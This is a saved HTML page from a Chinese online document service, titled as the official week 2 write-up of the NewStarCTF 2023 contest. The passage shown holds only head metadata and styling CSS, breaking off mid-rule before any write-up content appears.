<!DOCTYPE html>
<!-- saved from url=(0043)https://shimo.im/docs/Dy5ekHJhKo0ap5v3/read -->
<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="robots" content="noindex">
        
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,user-scalable=no">
        <meta name="theme-color" content="#000000">
        <meta name="version" content="1.4.6">
        <link rel="shortcut icon" href="https://as.smgv.cn/from_qbox/doc_favicon.ico">
        <meta name="description" content="石墨文档是一款轻便、简洁的在线协作文档工具，PC端和移动端全覆盖，支持多人同时对文档编辑和评论，让你与他人轻松完成协作撰稿、方案讨论、会议记录和资料共享等工作。">
        <meta name="keywords" content="在线协作文档,在线文档编辑,在线协作编辑,协同编辑,多人编辑,团队协作工具,文档管理工具,文档协作,文件存储,文件共享,协作办公,SAAS,云协作,google docs,在线office">
        <meta name="google" content="notranslate">
        <style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-4201804011 */
.randomClass-keafdv{position:fixed;overflow:auto;top:0;right:0;bottom:0;left:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;z-index:999;-webkit-overflow-scrolling:touch;outline:0;}.sm-modal-mask-hidden{display:none;}
</style><style type="text/css" data-styled-components="sfCUt inYJrZ" data-styled-components-is-local="true">/* sc-component-id: sc-1n784rm-0 */

.sfCUt{box-sizing:border-box;display:inline-block;border-radius:2px;border-width:1px;border-style:solid;background-color:#fff;text-align:center;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;-webkit-transition:opacity 0.3s,border-color 0.3s;transition:opacity 0.3s,border-color 0.3s;color:#666;border-width:0;background-image:linear-gradient(#fdfdfd,#f8f8f8);box-shadow:0 1px 1px 0 rgba(0,0,0,0.11);position:relative;font-size:12px;font-weight:bold;line-height:1.4;min-width:90px;height:30px;line-height:28px;padding:0 15px;}.sfCUt:focus{outline:none;}.sfCUt:active{opacity:0.9;}.sfCUt:hover{background-image:none;}.sfCUt::before{content:'';display:block;position:absolute;top:-1px;left:-1px;z-index:-1;width:100%;height:100%;border:1px solid rgba(65,70,75,0.05);border-radius:2px;-webkit-transition:opacity 0.3s ease-out;transition:opacity 0.3s ease-out;opacity:0;}.sfCUt:hover{border-radius:1px;}.sfCUt:hover::before{opacity:1;}.sfCUt[disabled]{border-radius:1px;}.sfCUt[disabled]::before{opacity:1;}.sfCUt:hover{background-image:linear-gradient(#fdfdfd,#f8f8f8);}.sfCUt:active{box-shadow:0 1px 1px 0 rgba(0,0,0,0.1);background-image:linear-gradient(#f0f0f0,#f7f7f7);}.sfCUt[disabled]{color:#ccc;background-color:#f7f7f7;}.sfCUt[disabled]::before{border-color:rgba(0,0,0,0.05);}.sfCUt[disabled]{cursor:not-allowed;background-image:none;}

.inYJrZ{box-sizing:border-box;display:inline-block;border-radius:2px;border-width:1px;border-style:solid;background-color:#fff;text-align:center;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;-webkit-transition:opacity 0.3s,border-color 0.3s;transition:opacity 0.3s,border-color 0.3s;color:#666;border-width:0;background-image:linear-gradient(#fdfdfd,#f8f8f8);box-shadow:0 1px 1px 0 rgba(0,0,0,0.11);position:relative;font-size:14px;font-weight:bold;line-height:1.4;min-width:100px;height:34px;line-height:32px;padding:0 15px;}.inYJrZ:focus{outline:none;}.inYJrZ:active{opacity:0.9;}.inYJrZ:hover{background-image:none;}.inYJrZ::before{content:'';display:block;position:absolute;top:-1px;left:-1px;z-index:-1;width:100%;height:100%;border:1px solid rgba(65,70,75,0.05);border-radius:2px;-webkit-transition:opacity 0.3s ease-out;transition:opacity 0.3s ease-out;opacity:0;}.inYJrZ:hover{border-radius:1px;}.inYJrZ:hover::before{opacity:1;}.inYJrZ[disabled]{border-radius:1px;}.inYJrZ[disabled]::before{opacity:1;}.inYJrZ:hover{background-image:linear-gradient(#fdfdfd,#f8f8f8);}.inYJrZ:active{box-shadow:0 1px 1px 0 rgba(0,0,0,0.1);background-image:linear-gradient(#f0f0f0,#f7f7f7);}.inYJrZ[disabled]{color:#ccc;background-color:#f7f7f7;}.inYJrZ[disabled]::before{border-color:rgba(0,0,0,0.05);}.inYJrZ[disabled]{cursor:not-allowed;background-image:none;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-1274816861 */
#ToastsContainer_ShimoUI .Toastify__toast-container{width:100%;text-align:center;height:0;padding:0;margin:0;margin-top:30px;right:0;}#ToastsContainer_ShimoUI .Toastify__toast{box-shadow:none;background:none;cursor:auto;overflow:visible;margin:0;padding:0;display:inline;}#ToastsContainer_ShimoUI .Toastify__toast:after{content:'\a';white-space:pre;}#ToastsContainer_ShimoUI .Toastify__toast-body{display:inline;}#ToastsContainer_ShimoUI .Toast_mask{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;background:transparent;z-index:999999;}
</style><style type="text/css" data-styled-components="gLVbAR kqIoIJ liDUmU" data-styled-components-is-local="true">/* sc-component-id: sc-chPdSV */

.gLVbAR{clear:both;width:816px;margin:0 auto;padding-top:25px;padding-bottom:25px;text-align:center;width:100%;}
/* sc-component-id: sc-kgoBCf */

.kqIoIJ{font-size:12px;color:#a5a5a5;-webkit-font-smoothing:antialiased;}
/* sc-component-id: sc-kGXeez */

.liDUmU{text-align:center;position:fixed;right:20px;bottom:48px;width:60px;height:60px;-webkit-text-decoration:none;text-decoration:none;box-shadow:0px 6px 10px rgba(0,0,0,0.1),0px 4px 16px rgba(0,0,0,0.06), 0px 1px 24px rgba(0,0,0,0.06);line-height:60px;border-radius:30px;font-size:20px;color:#41464b;-webkit-transform:scale(0.5);-ms-transform:scale(0.5);transform:scale(0.5);}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-1193784920 */
.randomClass-dhpOWU.sm-dropdown{position:absolute;left:-9999px;top:-9999px;display:block;z-index:1050;}.randomClass-dhpOWU.sm-dropdown .sm-dropdown-menu{box-shadow:0 2px 8px 0 rgba(0,0,0,0.15);}.randomClass-dhpOWU.sm-dropdown-tip::before{content:'';position:absolute;z-index:-1;display:block;width:10px;height:10px;background-color:#fff;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);box-shadow:0 0 6px 0 rgba(0,0,0,0.15);}.randomClass-dhpOWU.sm-dropdown-tip::after{content:'';display:block;position:absolute;border-color:transparent;border-width:6px;border-style:solid;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomLeft::before{left:20px;top:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomLeft::after{left:19px;top:-12px;border-bottom-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomRight::before{right:20px;top:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomRight::after{right:19px;top:-12px;border-bottom-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomCenter::before{left:50%;top:-4px;margin-left:-6px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomCenter::after{left:50%;top:-12px;margin-left:-6px;border-bottom-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topLeft::before{left:20px;bottom:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topLeft::after{left:19px;bottom:-12px;border-top-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topRight::before{right:20px;bottom:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topRight::after{right:19px;bottom:-12px;border-top-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topCenter::before{left:50%;bottom:-4px;margin-left:-6px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topCenter::after{left:50%;bottom:-12px;margin-left:-6px;border-top-color:#fff;}.randomClass-dhpOWU.sm-dropdown-hidden{display:none;}.randomClass-dhpOWU.sm-dropdown-mask{z-index:1050;position:absolute;top:0;bottom:0;left:0;right:0;}.randomClass-dhpOWU.sm-dropdown-mask-hidden{display:none;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-2145721762 */
.randomClass-mvIob{display:block;position:absolute;font-size:12px;-webkit-font-smoothing:auto;line-height:1.375;opacity:1;z-index:1060;}.randomClass-mvIob .sm-tooltip-inner{color:#fff;text-align:center;padding:6px 10px;background:#41464b;border-radius:2px;box-shadow:0 1px 3px 0 rgba(0,0,0,0.1);height:auto;line-height:1.375;white-space:normal;}.randomClass-mvIob.sm-tooltip-hidden{display:none;}.randomClass-mvIob .sm-tooltip-arrow{position:absolute;width:0;height:0;border-color:#41464b;border-style:solid;}.randomClass-mvIob .sm-tooltip-arrow::after{content:'';position:absolute;width:5px;height:5px;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);box-shadow:0 0 8px 0 rgba(0,0,0,0.4);z-index:-1;}.randomClass-mvIob.sm-tooltip-theme-blue .sm-tooltip-inner{background:#8ab3e9;}.randomClass-mvIob.sm-tooltip-theme-blue .sm-tooltip-inner{background:#8ab3e9;}.randomClass-mvIob.sm-tooltip-theme-blue .sm-tooltip-arrow{border-color:#8ab3e9;}.randomClass-mvIob.sm-tooltip-theme-white{opacity:1;}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-inner{color:#333;background:#fff;}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-inner{background:#fff;box-shadow:0 2px 8px 0 rgba(0,0,0,0.2);}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-arrow{border-color:#fff;}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-arrow::after{box-shadow:0 0 6px 0 rgba(0,0,0,0.2);}.randomClass-mvIob.sm-tooltip-placement-top,.randomClass-mvIob.sm-tooltip-placement-topLeft,.randomClass-mvIob.sm-tooltip-placement-topRight{padding-bottom:7px;}.randomClass-mvIob.sm-tooltip-placement-top .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-topLeft .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-topRight .sm-tooltip-arrow{bottom:3px;border-width:4px 4px 0;border-bottom-color:transparent;border-left-color:transparent;border-right-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-top .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-topLeft .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-topRight .sm-tooltip-arrow::after{left:-2.5px;top:-6.5px;}.randomClass-mvIob.sm-tooltip-placement-bottom,.randomClass-mvIob.sm-tooltip-placement-bottomLeft,.randomClass-mvIob.sm-tooltip-placement-bottomRight{padding-top:7px;}.randomClass-mvIob.sm-tooltip-placement-bottom .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomLeft .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomRight .sm-tooltip-arrow{top:3px;border-width:0 4px 4px;border-top-color:transparent;border-left-color:transparent;border-right-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-bottom .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-bottomLeft .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-bottomRight .sm-tooltip-arrow::after{left:-2.5px;top:1.5px;box-shadow:0 0 10px 0 rgba(0,0,0,0.2);}.randomClass-mvIob.sm-tooltip-placement-left,.randomClass-mvIob.sm-tooltip-placement-leftTop,.randomClass-mvIob.sm-tooltip-placement-leftBottom{padding-right:7px;}.randomClass-mvIob.sm-tooltip-placement-left .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-leftTop .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-leftBottom .sm-tooltip-arrow{right:3px;border-width:4px 0 4px 4px;border-top-color:transparent;border-bottom-color:transparent;border-right-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-left .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-leftTop .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-leftBottom .sm-tooltip-arrow::after{left:-6.5px;top:-2.5px;}.randomClass-mvIob.sm-tooltip-placement-right,.randomClass-mvIob.sm-tooltip-placement-rightTop,.randomClass-mvIob.sm-tooltip-placement-rightBottom{padding-left:7px;}.randomClass-mvIob.sm-tooltip-placement-right .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightTop .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightBottom .sm-tooltip-arrow{left:3px;border-width:4px 4px 4px 0;border-top-color:transparent;border-left-color:transparent;border-bottom-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-right .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-rightTop .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-rightBottom .sm-tooltip-arrow::after{left:1.5px;top:-2.5px;}.randomClass-mvIob.sm-tooltip-placement-top .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottom .sm-tooltip-arrow{left:50%;margin-left:-4px;}.randomClass-mvIob.sm-tooltip-placement-topLeft .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomLeft .sm-tooltip-arrow{left:16px;}.randomClass-mvIob.sm-tooltip-placement-topRight .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomRight .sm-tooltip-arrow{right:16px;}.randomClass-mvIob.sm-tooltip-placement-left .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-right .sm-tooltip-arrow{top:50%;margin-top:-4px;}.randomClass-mvIob.sm-tooltip-placement-leftTop .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightTop .sm-tooltip-arrow{top:8px;}.randomClass-mvIob.sm-tooltip-placement-leftBottom .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightBottom .sm-tooltip-arrow{bottom:8px;}
/* sc-component-id: sc-global-3280337108 */
.sm-tooltip.no-touch{pointer-events:none !important;}.sm-tooltip{pointer-events:auto !important;}.sm-tooltip *{pointer-events:auto !important;}
</style><style type="text/css" data-styled-components="bBZnOa cbYHdA iaSppr kOTtUa fWfGDr iAQwBy cuKFxh cZZyrb iObLYz cUDKsr jVcKXm dStWqN" data-styled-components-is-local="true">/* sc-component-id: sc-hzDkRC */

.iObLYz{position:relative;width:38px;min-width:38px;height:28px;margin:11px 15px 11px 0;}.iObLYz path{fill:rgba(65,70,75,0.3);}
/* sc-component-id: sc-jhAzac */

.cUDKsr{position:absolute;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);}
/* sc-component-id: sc-fMiknA */

.fWfGDr{pointer-events:none;height:20px;line-height:24px;margin-left:20px;box-shadow:none;background:inherit;max-width:656px;padding-bottom:4px;font-size:14px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
/* sc-component-id: sc-fAjcbJ */

.kOTtUa{display:block;height:18px;margin:16px 0;}.kOTtUa > path{fill:#41464b;}
/* sc-component-id: sc-caSCKo */

.iaSppr{float:left;-webkit-text-decoration:none;text-decoration:none;}
/* sc-component-id: sc-gisBJw */

.cbYHdA{margin-left:20px;}
/* sc-component-id: sc-kvZOFW */

.dStWqN{position:relative;width:38px;min-width:38px;height:28px;margin:11px 18px 11px 0px;}.dStWqN svg{position:absolute;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);}
/* sc-component-id: sc-keyframes-bBZnOa */
@-webkit-keyframes bBZnOa{0%{-webkit-transform:rotate(0);-ms-transform:rotate(0);transform:rotate(0);}50%{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg);}100%{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@keyframes bBZnOa{0%{-webkit-transform:rotate(0);-ms-transform:rotate(0);transform:rotate(0);}50%{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg);}100%{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}
/* sc-component-id: sc-btzYZH */

.jVcKXm{position:relative;width:72px;height:28px;box-sizing:border-box;margin-top:11px;text-align:center;font-size:14px;font-family:serif;font-weight:bold;border-radius:2px;cursor:pointer;}.jVcKXm.register{background:linear-gradient(180deg,#41464b 0%,#2c3033 100%);color:white;margin-right:10px;border:0;}.jVcKXm.login{background:linear-gradient(180deg,#ffffff 0%,#fafafa 98.11%);border:1px solid rgba(65,70,75,0.5);color:rgba(65,70,75,0.9);}.jVcKXm:hover{opacity:0.9;}
/* sc-component-id: sc-lhVmIH */

.iAQwBy{position:relative;width:8px;height:30px;padding:0;margin:10px 0 10px 15px;cursor:pointer;background-color:#fff;border:none;}.iAQwBy svg{position:absolute;top:calc(50% - 1px);left:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);}
/* sc-component-id: sc-bYSBpT */

.cZZyrb{vertical-align:bottom;margin-right:5px;}
/* sc-component-id: sc-elJkPf */

.cuKFxh{position:relative;height:12px;line-height:12px;margin:19px 0 19px 20px;font-size:12px;color:#a5a5a5;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-3361459923 */
.header-download-app .sm-modal-close{top:12px;right:12px;}
</style><style type="text/css" data-styled-components="doEjVX jqmOiT hAHnBB" data-styled-components-is-local="true">/* sc-component-id: sc-exAgwC */

.doEjVX{white-space:nowrap;width:100%;position:relative;background:linear-gradient(180deg,#fdfdfd,#fff);z-index:110;height:50px;box-shadow:0 2px 3px 0 rgba(100,100,100,0.15);-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;overflow:hidden;border-bottom:1px solid #fff;}.doEjVX::after{clear:both;content:'';display:table;}
/* sc-component-id: sc-cQFLBn */

.jqmOiT{position:relative;float:left;padding-left:0px;}.jqmOiT > a,.jqmOiT > div,.jqmOiT > button{display:inline-block;vertical-align:middle;}
/* sc-component-id: sc-gojNiO */

.hAHnBB{position:absolute;right:0;background-color:white;}.hAHnBB > a,.hAHnBB > div,.hAHnBB > button,.hAHnBB > span{float:left;vertical-align:middle;margin-right:10px;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-2858897182 */
html{line-height:1.15;-webkit-text-size-adjust:100%;}body{margin:0;}main{display:block;}h1{font-size:2em;margin:0.67em 0;}hr{box-sizing:content-box;height:0;overflow:visible;}pre{font-family:monospace,monospace;font-size:1em;}a{background-color:transparent;}abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;}b,strong{font-weight:bolder;}code,kbd,samp{font-family:monospace,monospace;font-size:1em;}small{font-size:80%;}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline;}sub{bottom:-0.25em;}sup{top:-0.5em;}img{border-style:none;}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0;}button,input{overflow:visible;}button,select{text-transform:none;}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0;}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText;}fieldset{padding:0.35em 0.75em 0.625em;}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal;}progress{vertical-align:baseline;}textarea{overflow:auto;}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0;}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto;}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px;}[type="search"]::-webkit-search-decoration{-webkit-appearance:none;}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}details{display:block;}summary{display:list-item;}template{display:none;}[hidden]{display:none;}body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC",Helvetica,Tahoma,Arial,"Microsoft YaHei",微软雅黑,黑体,Heiti,sans-serif,SimSun,宋体,serif;background-color:#F7F7F7;}*{margin:0;padding:0;outline:none;}button,input,optgroup,select,textarea{font-family:inherit;}.hide{display:none;}@media screen and (-webkit-min-device-pixel-ratio:2),screen and (min-resolution:2dppx){body{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}}
</style>
<link href="./NewStarCTF 2023 Week2 官方WriteUp_files/doc-8c8f5ec1e6.css" rel="stylesheet"><style>.ql-snow [ql-global]{}</style>
        <title>NewStarCTF 2023 Week2 官方WriteUp</title>
    <style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css">.Toastify__toast-container {
  z-index: 9999;
  position: fixed;
  padding: 4px;
  width: 320px;
  box-sizing: border-box;
  color: #fff; }
  .Toastify__toast-container--top-left {
    top: 1em;
    left: 1em; }
  .Toastify__toast-container--top-center {
    top: 1em;
    left: 50%;
    margin-left: -160px; }
  .Toastify__toast-container--top-right {
    top: 1em;
    right: 1em; }
  .Toastify__toast-container--bottom-left {
    bottom: 1em;
    left: 1em; }
  .Toastify__toast-container--bottom-center {
    bottom: 1em;
    left: 50%;
    margin-left: -160px; }
  .Toastify__toast-container--bottom-right {
    bottom: 1em;
    right: 1em; }

@media only screen and (max-width: 480px) {
  .Toastify__toast-container {
    width: 100vw;
    padding: 0;
    left: 0;
    margin: 0; }
    .Toastify__toast-container--top-left, .Toastify__toast-container--top-center, .Toastify__toast-container--top-right {
      top: 0; }
    .Toastify__toast-container--bottom-left, .Toastify__toast-container--bottom-center, .Toastify__toast-container--bottom-right {
      bottom: 0; }
    .Toastify__toast-container--rtl {
      right: 0;
      left: initial; } }

.Toastify__toast {
  position: relative;
  min-height: 64px;
  box-sizing: border-box;
  margin-bottom: 1rem;
  padding: 8px;
  border-radius: 1px;
  box-shadow: 0 1px 10px 0 rgba(0, 0, 0, 0.1), 0 2px 15px 0 rgba(0, 0, 0, 0.05);
  display: flex;
  justify-content: space-between;
  max-height: 800px;
  overflow: hidden;
  font-family: sans-serif;
  cursor: pointer;
  direction: ltr; }
  .Toastify__toast--rtl {
    direction: rtl; }
  .Toastify__toast--default {
    background: #fff;
    color: #aaa; }
  .Toastify__toast--info {
    background: #3498db; }
  .Toastify__toast--success {
    background: #07bc0c; }
  .Toastify__toast--warning {
    background: #f1c40f; }
  .Toastify__toast--error {
    background: #e74c3c; }
  .Toastify__toast-body {
    margin: auto 0;
    flex: 1; }

@media only screen and (max-width: 480px) {
  .Toastify__toast {
    margin-bottom: 0; } }

.Toastify__close-button {
  color: #fff;
  font-weight: bold;
  font-size: 14px;
  background: transparent;
  outline: none;
  border: none;
  padding: 0;
  cursor: pointer;
  opacity: 0.7;
  transition: 0.3s ease;
  align-self: flex-start; }
  .Toastify__close-button--default {
    color: #000;
    opacity: 0.3; }
  .Toastify__close-button:hover, .Toastify__close-button:focus {
    opacity: 1; }

@-webkit-keyframes Toastify__trackProgress {
  0% {
    width: 100%; }
  100% {
    width: 0; } }

@keyframes Toastify__trackProgress {
  0% {
    width: 100%; }
  100% {
    width: 0; } }

.Toastify__progress-bar {
  position: absolute;
  bottom: 0;
  left: 0;
  width: 0;
  height: 5px;
  z-index: 9999;
  opacity: 0.7;
  -webkit-animation: Toastify__trackProgress linear 1;
          animation: Toastify__trackProgress linear 1;
  background-color: rgba(255, 255, 255, 0.7); }
  .Toastify__progress-bar--rtl {
    right: 0;
    left: initial; }
  .Toastify__progress-bar--default {
    background: linear-gradient(to right, #4cd964, #5ac8fa, #007aff, #34aadc, #5856d6, #ff2d55); }

@-webkit-keyframes Toastify__bounceInRight {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(3000px, 0, 0);
            transform: translate3d(3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(-25px, 0, 0);
            transform: translate3d(-25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(10px, 0, 0);
            transform: translate3d(10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(-5px, 0, 0);
            transform: translate3d(-5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@keyframes Toastify__bounceInRight {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(3000px, 0, 0);
            transform: translate3d(3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(-25px, 0, 0);
            transform: translate3d(-25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(10px, 0, 0);
            transform: translate3d(10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(-5px, 0, 0);
            transform: translate3d(-5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@-webkit-keyframes Toastify__bounceOutRight {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(-20px, 0, 0);
            transform: translate3d(-20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
            transform: translate3d(2000px, 0, 0); } }

@keyframes Toastify__bounceOutRight {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(-20px, 0, 0);
            transform: translate3d(-20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
            transform: translate3d(2000px, 0, 0); } }

@-webkit-keyframes Toastify__bounceInLeft {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(-3000px, 0, 0);
            transform: translate3d(-3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(25px, 0, 0);
            transform: translate3d(25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(-10px, 0, 0);
            transform: translate3d(-10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(5px, 0, 0);
            transform: translate3d(5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@keyframes Toastify__bounceInLeft {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(-3000px, 0, 0);
            transform: translate3d(-3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(25px, 0, 0);
            transform: translate3d(25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(-10px, 0, 0);
            transform: translate3d(-10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(5px, 0, 0);
            transform: translate3d(5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@-webkit-keyframes Toastify__bounceOutLeft {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(20px, 0, 0);
            transform: translate3d(20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
            transform: translate3d(-2000px, 0, 0); } }

@keyframes Toastify__bounceOutLeft {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(20px, 0, 0);
            transform: translate3d(20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
            transform: translate3d(-2000px, 0, 0); } }

@-webkit-keyframes Toastify__bounceInUp {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 3000px, 0);
            transform: translate3d(0, 3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  75% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  90% {
    -webkit-transform: translate3d(0, -5px, 0);
            transform: translate3d(0, -5px, 0); }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__bounceInUp {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 3000px, 0);
            transform: translate3d(0, 3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  75% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  90% {
    -webkit-transform: translate3d(0, -5px, 0);
